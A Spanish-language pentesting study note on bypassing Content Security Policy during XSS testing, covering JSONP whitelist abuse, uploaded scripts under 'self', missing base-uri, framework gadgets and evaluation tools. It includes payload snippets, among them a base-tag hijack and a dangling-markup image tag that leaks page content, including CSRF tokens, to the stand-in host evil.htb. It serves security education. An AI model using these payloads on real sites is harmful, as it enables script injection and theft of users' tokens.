---
tags:
  - Web/Red-Team
  - Pentesting
  - Pentesting/Explotacion
  - XSS
  - CSP
Fecha de actualización: 2026-06-08
Nota previa: "[[04 - Content Security Policy (CSP)]]"
Nota siguiente: "[[06 - Evasión de filtros XSS y ofuscación]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

Que una aplicación tenga [[04 - Content Security Policy (CSP)|CSP]] no significa que esté protegida. <mark style="background: #FFB86CA6;">Una CSP débil se sortea, y evaluar la política en busca de huecos es parte del trabajo ante cualquier XSS bloqueado</mark>. El bypass depende de la política concreta; estas son las familias que cubren la mayoría de casos reales.

# JSONP: el bypass clásico de whitelists

Considera esta CSP, que parece razonable:

```http
Content-Security-policy: default-src 'none'; img-src 'self'; script-src 'self' https://*.google.com;
```

Permite scripts del propio origen y de cualquier subdominio de Google. El problema: <mark style="background: #FFB8EBA6;">muchos dominios "de confianza" alojan endpoints `JSONP`</mark>. JSONP usa etiquetas `<script>` (exentas de la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]]) para devolver datos envueltos en una llamada a una función que tú especificas vía el parámetro `callback`. Si controlas el callback, controlas qué JavaScript ejecuta el endpoint:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

Como el script viene de `*.google.com`, la CSP lo permite, y el `callback=alert(1)` ejecuta tu código. Este endpoint concreto es ilustrativo —muchos gadgets JSONP de Google se han retirado con los años—. <mark style="background: #FF5582A6;">El repositorio [CSPBypass](https://github.com/renniepak/CSPBypass) mantiene una lista actualizada de endpoints JSONP por dominio</mark> — la primera parada cuando una CSP permite un host conocido.

# `'self'` no es seguro por sí solo

`script-src 'self'` parece sólido: solo scripts del propio origen. Pero <mark style="background: #8000E1A6;">si la aplicación permite subir ficheros, puedes alojar tu JavaScript en el propio origen</mark>:

```html
<script src="/uploads/avatar.jpg.js"></script>
```

Si la app acepta una extensión arbitraria (o no valida el `Content-Type` servido), subes un `.js` y lo cargas desde `'self'`. Lo mismo aplica a un *open redirect* en un dominio permitido, o a cualquier endpoint del origen que refleje contenido controlado y se sirva como JavaScript.

# Directivas que faltan: `base-uri` y dangling markup

Las políticas suelen olvidar directivas defensivas que abren bypass aunque `script-src` sea estricto:

- **`base-uri` ausente**: si la página carga scripts con rutas **relativas** (`<script src="/app.js">`) y falta `base-uri`, inyecta una etiqueta `<base>` para secuestrar el origen base y redirigir esas cargas a tu servidor:
  ```html
  <base href="https://evil.htb/">
  ```
- **Dangling markup**: cuando `script-src` impide ejecutar pero `img-src`/`connect-src` permiten orígenes externos, <mark style="background: #FFB86CA6;">se puede **exfiltrar** sin ejecutar JavaScript</mark>. Una etiqueta de imagen sin cerrar captura el HTML (incluido un token CSRF) hasta la siguiente comilla y lo envía a tu servidor (los navegadores modernos mitigan parte de esto —Chrome bloquea ciertos caracteres sin codificar en la URL—, así que hoy es más fiable contra políticas que olvidan `base-uri`/`form-action`):
  ```html
  <img src="https://evil.htb/leak?d=
  ```

# Gadgets: `unsafe-eval` y frameworks

Si la CSP incluye `unsafe-eval`, o si la aplicación usa un framework con *gadgets* explotables (AngularJS clásico, ciertas plantillas), se puede lograr ejecución aun sin `unsafe-inline`. Los frameworks que evalúan expresiones (`{{...}}`) sobre el DOM ofrecen *gadgets* que convierten una inyección de HTML en ejecución de JS dentro de la política. Es la línea de investigación de Google *"CSP Is Dead, Long Live CSP"*, que motivó el giro hacia [[04 - Content Security Policy (CSP)|nonces + strict-dynamic]].

# Detección y herramientas

<mark style="background: #FF5582A6;">El primer paso ante cualquier CSP es evaluarla buscando el eslabón débil</mark>:

- **[CSP Evaluator](https://csp-evaluator.withgoogle.com/)** (Google): pega la política y señala directivas peligrosas — `unsafe-inline`, hosts con JSONP conocido, falta de `object-src`/`base-uri`.
- **[CSPBypass](https://github.com/renniepak/CSPBypass)**: busca por dominio permitido si existe un gadget JSONP o un bypass conocido.
- Revisa la CSP en cada respuesta (las cabeceras cambian por endpoint) y comprueba si el `nonce` se **reutiliza** entre peticiones — un nonce estático es tan inútil como no tenerlo.

> [!warning]+ Evalúa la CSP en su contexto, no en abstracto
> Ninguna CSP es "segura" o "insegura" en el vacío. `script-src 'self'` es sólido en una app sin uploads y trivialmente sorteable en una que los permita. <mark style="background: #FFB86CA6;">El bypass depende de la combinación de la política **y** la funcionalidad de la aplicación</mark>: uploads, redirects, endpoints que reflejan, frameworks. Analiza siempre las dos cosas juntas.

La CSP es una barrera; la otra gran barrera ante un XSS son los filtros de entrada y los WAF. La evasión avanzada de esos filtros cierra el sub-tema: [[06 - Evasión de filtros XSS y ofuscación]].

> [!info]+ Fuentes de referencia
> - [CSPBypass (renniepak)](https://github.com/renniepak/CSPBypass) · [PortSwigger — CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
> - [Google research — "CSP Is Dead, Long Live CSP"](https://research.google/pubs/pub45542/)
> - [PayloadsAllTheThings — CSP bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
